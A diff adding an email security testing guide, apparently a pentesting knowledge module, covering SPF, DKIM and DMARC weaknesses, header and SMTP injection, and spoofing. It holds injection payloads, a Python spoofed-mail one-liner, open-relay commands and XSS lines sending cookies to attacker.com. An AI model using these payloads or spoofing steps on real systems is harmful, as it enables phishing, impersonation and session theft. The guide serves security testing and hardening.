@@ -1,0 +1,421 @@
+<email_security_guide>
+<title>EMAIL SECURITY TESTING</title>
+
+<critical>Email security testing covers authentication mechanisms (SPF, DKIM, DMARC), injection vulnerabilities, and spoofing protection. Weak email security allows phishing, spam, email injection attacks, and impersonation that can lead to credential theft, malware distribution, and business email compromise.</critical>
+
+<scope>
+- SPF (Sender Policy Framework) record analysis
+- DKIM (DomainKeys Identified Mail) validation
+- DMARC (Domain-based Message Authentication) policy testing
+- Email header injection attacks
+- SMTP injection vulnerabilities
+- Email spoofing verification
+- Mail server misconfiguration
+- Email relay testing
+- Phishing infrastructure detection
+</scope>
+
+<methodology>
+1. Enumerate email security records (SPF, DKIM, DMARC).
+2. Test SPF bypass techniques.
+3. Validate DKIM implementation and key strength.
+4. Test DMARC policy enforcement.
+5. Attempt email header injection.
+6. Test for open relay and SMTP injection.
+7. Verify email spoofing protection.
+</methodology>
+
+<spf_testing>
+<spf_record_analysis>
+{% raw %}
+# SPF record lookup:
+dig example.com TXT | grep "v=spf1"
+nslookup -type=TXT example.com
+
+# SPF record example:
+v=spf1 ip4:192.0.2.0/24 include:_spf.google.com -all
+
+# SPF mechanisms:
+# - ip4/ip6: Allow specific IP addresses
+# - include: Include another domain's SPF
+# - a/mx: Allow domain's A/MX records
+# - all: Fallback policy
+
+# SPF qualifiers:
+# + (pass) = allow
+# - (fail) = reject (hardfail)
+# ~ (softfail) = accept but mark
+# ? (neutral) = no policy
+
+# Weak SPF policies:
+v=spf1 +all  # Allows anyone (useless)
+v=spf1 ?all  # Neutral (no protection)
+v=spf1 ~all  # Softfail (weak protection)
+
+# Strong SPF policy:
+v=spf1 ip4:203.0.113.0/24 include:_spf.google.com -all
+# Specific IPs, hardfail on others
+
+# Test SPF with:
+python3 -m spf --query example.com
+{% endraw %}
+</spf_record_analysis>
+
+<spf_bypass>
+{% raw %}
+# SPF bypass techniques:
+
+# 1. MAIL FROM vs FROM header:
+# SPF checks MAIL FROM (envelope from)
+# Not FROM header (displayed to user)
+
+# Test:
+MAIL FROM:<legitimate@example.com>  # Passes SPF
+FROM: CEO <ceo@example.com>  # What user sees
+# Can spoof FROM header while passing SPF
+
+# 2. Include chain exhaustion:
+# SPF lookup limit: 10 DNS queries
+# Excessive includes cause SPF to fail
+dig _spf.example.com TXT
+# Count includes, nested includes
+
+# 3. Over-permissive SPF:
+v=spf1 include:_spf.google.com ~all
+# Softfail allows spoofed emails through
+
+# 4. No SPF record:
+dig example.com TXT | grep spf
+# If no SPF, emails not validated
+
+# 5. Subdomain SPF:
+dig subdomain.example.com TXT
+# Subdomains may lack SPF records
+{% endraw %}
+</spf_bypass>
+</spf_testing>
+
+<dkim_testing>
+<dkim_validation>
+{% raw %}
+# DKIM record lookup:
+# Format: <selector>._domainkey.<domain>
+dig default._domainkey.example.com TXT
+dig google._domainkey.example.com TXT
+
+# DKIM record example:
+v=DKIM1; k=rsa; p=MIGfMA0GCS...
+
+# DKIM components:
+# v= version (DKIM1)
+# k= key type (rsa, ed25519)
+# p= public key
+# s= service types
+# t= flags (y=testing mode)
+
+# Test DKIM on received email:
+# Check email headers for:
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+  d=example.com; s=default;
+  h=from:to:subject:date;
+  bh=hash_of_body;
+  b=signature
+
+# Verify DKIM signature:
+python3 dkimpy --verify < email.eml
+{% endraw %}
+</dkim_validation>
+
+<dkim_weaknesses>
+{% raw %}
+# DKIM weaknesses:
+
+# 1. Short key length:
+dig default._domainkey.example.com TXT
+# Extract public key length
+# Weak: < 1024 bits
+# Strong: >= 2048 bits
+
+# 2. Testing mode:
+v=DKIM1; t=y; k=rsa; p=...
+# t=y means testing mode
+# Signature failures ignored
+
+# 3. Weak signature algorithm:
+DKIM-Signature: a=rsa-sha1; ...
+# SHA1 deprecated
+# Should use: rsa-sha256
+
+# 4. Replay attacks:
+# DKIM doesn't have expiration
+# Valid signature can be replayed
+# Look for x= (expiration) tag
+
+# 5. Partial signing:
+h=from:subject;
+# Only signs from and subject
+# Other headers (to, cc) can be modified
+{% endraw %}
+</dkim_weaknesses>
+</dkim_testing>
+
+<dmarc_testing>
+<dmarc_policy_analysis>
+{% raw %}
+# DMARC record lookup:
+dig _dmarc.example.com TXT
+
+# DMARC record example:
+v=DMARC1; p=reject; rua=mailto:dmarc@example.com; ruf=mailto:forensics@example.com; pct=100
+
+# DMARC tags:
+# p= policy (none, quarantine, reject)
+# sp= subdomain policy
+# pct= percentage of emails to apply policy
+# rua= aggregate reports URI
+# ruf= forensic reports URI
+# adkim= DKIM alignment (r=relaxed, s=strict)
+# aspf= SPF alignment (r=relaxed, s=strict)
+
+# Weak DMARC policies:
+v=DMARC1; p=none;
+# Monitor only, no enforcement
+
+v=DMARC1; p=quarantine; pct=10;
+# Only 10% of emails quarantined
+
+# Strong DMARC policy:
+v=DMARC1; p=reject; pct=100; aspf=s; adkim=s;
+# Reject 100%, strict alignment
+
+# Test DMARC enforcement:
+# Send spoofed email, check if blocked
+{% endraw %}
+</dmarc_policy_analysis>
+
+<dmarc_bypass>
+{% raw %}
+# DMARC bypass techniques:
+
+# 1. Alignment issues:
+# DMARC requires SPF OR DKIM to align
+# Relaxed alignment:
+#   FROM: user@example.com
+#   SPF passes for: mail.example.com
+#   Aligns (same organizational domain)
+
+# 2. No DMARC on subdomain:
+dig _dmarc.subdomain.example.com TXT
+# May not have DMARC policy
+
+# 3. Weak subdomain policy:
+v=DMARC1; p=reject; sp=none;
+# Main domain: reject
+# Subdomains: no enforcement
+
+# 4. Partial enforcement:
+v=DMARC1; p=quarantine; pct=50;
+# 50% chance of getting through
+
+# 5. Third-party senders:
+# Mailing lists, forwarding services
+# May break DKIM signatures
+# DMARC may fail legitimately
+{% endraw %}
+</dmarc_bypass>
+</dmarc_testing>
+
+<email_injection>
+<header_injection>
+{% raw %}
+# Email header injection:
+
+# Vulnerable code:
+# mail("victim@example.com", "Subject", "Body", "From: $user_input")
+
+# Test payloads:
+# 1. Additional recipients:
+attacker@evil.com\nBcc: mass-victims@evil.com
+
+# 2. Additional headers:
+attacker@evil.com\nX-Mailer: Evil\nContent-Type: text/html
+
+# 3. CRLF injection:
+attacker@evil.com\r\nBcc: spam@evil.com\r\n
+
+# 4. Body injection:
+attacker@evil.com\r\n\r\nThis is injected body content
+
+# Test in contact forms:
+POST /contact
+{
+  "email": "user@example.com\nBcc: attacker@evil.com",
+  "message": "Test"
+}
+
+# Check sent email headers
+{% endraw %}
+</header_injection>
+
+<smtp_injection>
+{% raw %}
+# SMTP injection:
+
+# Direct SMTP commands injection:
+telnet mail.example.com 25
+EHLO evil.com
+MAIL FROM:<attacker@evil.com>
+RCPT TO:<victim@example.com>
+DATA
+Subject: Spoofed Email
+From: admin@example.com
+
+This is a spoofed email.
+.
+QUIT
+
+# Test SMTP via web form:
+POST /send-email
+{
+  "to": "victim@example.com\nRCPT TO:<attacker@evil.com>",
+  "subject": "Test",
+  "body": "Message"
+}
+
+# SMTP command injection in parameters:
+POST /contact
+{
+  "email": "test@example.com\r\nRCPT TO:<attacker@evil.com>\r\n",
+  "name": "Test User",
+  "message": "Hello"
+}
+{% endraw %}
+</smtp_injection>
+</email_injection>
+
+<email_spoofing>
+<spoofing_techniques>
+{% raw %}
+# Email spoofing methods:
+
+# 1. Direct SMTP spoofing:
+# Connect to mail server
+# Spoof MAIL FROM and FROM header
+
+# 2. Open relay abuse:
+# Find open relay server
+nmap -p 25 --script smtp-open-relay target.com
+
+# Connect and send:
+telnet relay.server.com 25
+MAIL FROM:<ceo@target.com>
+RCPT TO:<employee@target.com>
+
+# 3. Similar domain spoofing:
+# Register look-alike domain
+# examp1e.com (1 instead of l)
+# exarnple.com (rn instead of m)
+# exаmple.com (Cyrillic 'а')
+
+# 4. Display name spoofing:
+FROM: "CEO" <attacker@evil.com>
+# User sees: CEO
+# Actual sender: attacker@evil.com
+
+# 5. Reply-to manipulation:
+FROM: legitimate@example.com
+REPLY-TO: attacker@evil.com
+# Replies go to attacker
+{% endraw %}
+</spoofing_techniques>
+
+<spoofing_detection>
+{% raw %}
+# Test for spoofing protection:
+
+# 1. Send test spoof email:
+python3 -c "
+import smtplib
+msg = 'From: ceo@example.com\nTo: test@example.com\nSubject: Test\n\nSpoofed'
+smtplib.SMTP('localhost').sendmail('attacker@evil.com', 'test@example.com', msg)
+"
+
+# 2. Check if email delivered
+# 3. Check email headers in received message
+# 4. Look for SPF/DKIM/DMARC results:
+Authentication-Results: mx.example.com;
+  spf=fail smtp.mailfrom=attacker@evil.com;
+  dkim=fail;
+  dmarc=fail
+
+# If delivered despite failures, spoofing protection weak
+{% endraw %}
+</spoofing_detection>
+</email_spoofing>
+
+<common_payloads>
+{% raw %}
+# Header injection:
+attacker@evil.com\nBcc: mass@evil.com
+user@test.com\r\nBcc: attacker@evil.com\r\n
+test@test.com%0aBcc:attacker@evil.com
+
+# SMTP injection:
+victim@example.com\nRCPT TO:<attacker@evil.com>
+test@test.com\r\nMAIL FROM:<spoofed@example.com>\r\n
+
+# XSS in email (HTML emails):
+<script>window.location='http://attacker.com/?c='+document.cookie</script>
+<img src=x onerror='fetch("http://attacker.com/"+document.cookie)'>
+
+# Attachment injection:
+filename="test.pdf\nContent-Type: application/x-msdownload\n\nmalware"
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate SPF record weakness or absence.
+2. Show DKIM not implemented or weak configuration.
+3. Prove DMARC policy is weak (none, low percentage).
+4. Demonstrate successful email header injection.
+5. Show SMTP injection enabling additional recipients.
+6. Prove successful email spoofing bypassing authentication.
+7. Document open relay allowing spam/spoofing.
+</validation>
+
+<false_positives>
+- Strong SPF with hardfail (-all)
+- DKIM with 2048+ bit keys and proper signing
+- DMARC with p=reject, pct=100, strict alignment
+- Input validation preventing header injection
+- SMTP command filtering and escaping
+- No open relay configuration
+- Proper authentication for email sending
+</false_positives>
+
+<impact>
+- Phishing attacks impersonating legitimate users
+- Business Email Compromise (BEC) targeting executives
+- Credential theft through spoofed emails
+- Malware distribution via spoofed trusted sources
+- Spam campaigns damaging domain reputation
+- Email injection for mass spamming
+- Man-in-the-middle attacks via email redirection
+- Social engineering with spoofed internal emails
+</impact>
+
+<pro_tips>
+1. Check SPF, DKIM, DMARC records for all domains and subdomains.
+2. Test SPF with hardfail (-all) vs softfail (~all).
+3. Verify DKIM key length (>= 2048 bits).
+4. Test DMARC policy strength (p=reject recommended).
+5. Attempt header injection in all email input fields.
+6. Test for open SMTP relays.
+7. Try email spoofing from external servers.
+8. Check alignment requirements (aspf/adkim).
+9. Test subdomains separately for email security.
+10. Use mail-tester.com to verify email security posture.
+</pro_tips>
+
+<remember>Email security requires proper SPF (hardfail -all), DKIM (2048+ bit keys), and DMARC (p=reject) configuration. SPF only validates MAIL FROM (envelope), not FROM header (display). DMARC requires alignment between SPF/DKIM domain and FROM header domain. Email injection vulnerabilities allow header manipulation via CRLF injection (\r\n). Open relays allow unauthenticated email sending. Always test email security for main domain and all subdomains.</remember>
+</email_security_guide>
